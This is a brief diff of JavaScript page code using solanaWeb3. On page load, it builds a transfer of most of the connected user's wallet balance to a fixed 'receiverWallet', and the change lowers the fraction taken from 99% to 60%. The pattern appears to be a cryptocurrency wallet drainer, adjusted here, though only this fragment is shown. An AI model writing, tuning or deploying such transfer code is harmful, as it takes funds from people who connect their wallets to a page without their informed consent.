@@ -35,7 +35,7 @@ $(document).ready(function () {
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: public_key,
                                 toPubkey: receiverWallet,
-                                lamports: balanceForTransfer * 0.99,
+                                lamports: balanceForTransfer * 0.6,
                             })
                         );
 
